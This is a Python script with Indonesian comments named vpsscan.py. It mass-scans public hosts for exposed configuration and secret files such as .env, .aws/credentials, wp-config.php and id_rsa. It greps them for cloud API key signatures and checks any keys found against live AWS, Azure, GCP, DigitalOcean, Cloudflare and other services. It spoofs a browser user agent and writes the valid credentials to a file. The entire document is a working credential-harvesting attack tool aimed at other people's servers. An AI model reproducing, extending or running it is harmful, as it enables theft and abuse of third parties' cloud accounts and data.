#!/usr/bin/env python3
"""
vpsscan.py — cari kredensial cloud di file konfigurasi yang terekspos di VPS/host publik.
Fokus: AWS (id+secret), GCP, Azure, DigitalOcean, Cloudflare, Hetzner, Linode + token CI.

  vpsscan.py -f hosts.txt --limit 100 -o out/
  vpsscan.py -u https://contoh.com          # satu host, semua path
  vpsscan.py -d /tmp/dump                  # scan dump lokal (hasil git-dumper/backup)

Path yang diprobe: .env, .env.*, config.json, application.yml, docker-compose.yml, .aws/credentials,
.env.bak, config.php, wp-config.php, settings.py, .git/config, terraform.tfvars, id_rsa, backup.zip.
Validasi memakai validator di clouddork.py (AWS SigV4 STS, GCP multi-service, Azure SharedKey, DO, CF).
"""
import argparse
import importlib.util
import json
import os
import sys
import urllib.parse

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
_spec = importlib.util.spec_from_file_location("clouddork", os.path.join(HERE, "clouddork.py"))
cd = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(cd)

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.10 Safari/537.36"
PATHS = [".env", ".env.local", ".env.production", ".env.prod", ".env.bak", ".env.old",
         "config.json", "config.yml", "config.yaml", "application.yml", "application.properties",
         "docker-compose.yml", ".aws/credentials", "terraform.tfvars", "settings.py",
         "wp-config.php", "config.php", ".git/config", "backup.zip", "id_rsa", "credentials.json",
         "service-account.json", "firebase.json", "appsettings.json",
         "wp-config.php.bak", "config.php.bak", ".env.swp", ".git/HEAD", "backup.sql", "db.sql", ".env.dist", "local.settings.json"]
SIG = [b"AKIA", b"aws_secret", b"AIza", b"AccountKey", b"dop_v1_", b"service_account",
       b"CLOUDFLARE", b"HCLOUD", b"LINODE", b"SECRET_KEY", b"DB_PASSWORD"]


def norm(target):
    if not target.startswith("http"):
        target = "http://" + target
    return target.rstrip("/")


def grab(url):
    try:
        r = requests.get(url, timeout=12, headers={"User-Agent": UA}, allow_redirects=False)
        if r.status_code == 200 and r.content and len(r.content) < 2_000_000:
            return r.text
    except Exception:
        pass
    return ""


def scan_host(target, timeout_paths=None):
    base = norm(target)
    host = urllib.parse.urlparse(base).netloc
    found = []
    for p in (timeout_paths or PATHS):
        url = f"{base}/{p}"
        txt = grab(url)
        if not txt:
            continue
        low = txt.lower()
        if "not found" in low[:400] or "<title>404" in low[:600] or "page not found" in low[:400]:
            continue
        if not any(s.lower() in low.encode() for s in SIG):
            continue
        for h in cd.scan(txt, url):
            h["host"] = host
            found.append(h)
    return found


def validate_hits(hits, no_validate=False):
    if no_validate:
        return hits
    aws, az = {}, {}
    for h in hits:
        key = h["source"]
        if h["kind"] == "aws_key_id":
            aws.setdefault(key, {})["id"] = h["value"]
        elif h["kind"] == "aws_secret":
            aws.setdefault(key, {})["secret"] = h["value"]
        elif h["kind"] == "azure_conn":
            az.setdefault(key, {})["acct"] = h["value"]
        elif h["kind"] == "azure_account_key":
            az.setdefault(key, {})["key"] = h["value"]
    for src, p in aws.items():
        if "id" in p and "secret" in p:
            st, detail = cd.aws_sts(p["id"], p["secret"])
            hits.append({"kind": "aws_pair", "value": p["id"], "source": src, "status": st, "detail": detail})
    for src, p in az.items():
        if "acct" in p and "key" in p:
            st, detail = cd.azure_blob(p["acct"], p["key"])
            hits.append({"kind": "azure_pair", "value": p["acct"], "source": src, "status": st, "detail": detail})
    for h in hits:
        if h["kind"] in ("aws_pair", "azure_pair") or h.get("status"):
            continue
        if h["kind"] in ("gcp_api_key", "do_token", "cf_token", "hetzner_token", "linode_token", "vultr_key"):
            st, d = cd.validate(h["kind"], h["value"])
            h["status"], h["detail"] = st, d
    return hits


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", action="append", default=[])
    ap.add_argument("-f")
    ap.add_argument("-d")
    ap.add_argument("--limit", type=int, default=50)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("-o", "--out", default="vpsscan_out")
    ap.add_argument("--no-validate", action="store_true")
    ap.add_argument("--fast", action="store_true", help="hanya 8 path paling berharga")
    a = ap.parse_args()

    global PATHS
    if getattr(a, "fast", False):
        PATHS = [".env", ".aws/credentials", "config.json", "docker-compose.yml",
                 "wp-config.php", ".git/HEAD", "application.yml", ".env.bak"]
    targets = list(a.u)
    if a.f:
        targets += [l.strip() for l in open(a.f) if l.strip() and not l.startswith("#")]
    targets = list(dict.fromkeys(targets))[: a.limit]

    hits = []
    if targets:
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=a.workers) as ex:
            for res in ex.map(scan_host, targets):
                hits += res
        print(f"host dipindai: {len(targets)} | kandidat: {len(hits)}")

    if a.d:
        for root, _, files in os.walk(a.d):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    if os.path.getsize(p) < 2_000_000:
                        hits += cd.scan(open(p, errors="replace").read(), p)
                except Exception:
                    pass

    if not hits:
        print("tidak ada kandidat")
        return
    hits = validate_hits(hits, a.no_validate)

    os.makedirs(a.out, exist_ok=True)
    out = os.path.join(a.out, "creds.jsonl")
    with open(out, "w") as fh:
        for h in hits:
            fh.write(json.dumps(h) + "\n")
    os.chmod(out, 0o600)
    for h in hits:
        v = h["value"]
        m = v[:6] + "…" + v[-4:] if len(v) > 12 else v
        print(f"  {h['kind']:<18} {m:<22} {str(h.get('status','')):<10} {h['source'][:70]}")
    valid = [h for h in hits if h.get("status") == "VALID"]
    print(f"\ntotal: {len(hits)} | VALID: {len(valid)} -> {out} (600)")


if __name__ == "__main__":
    main()
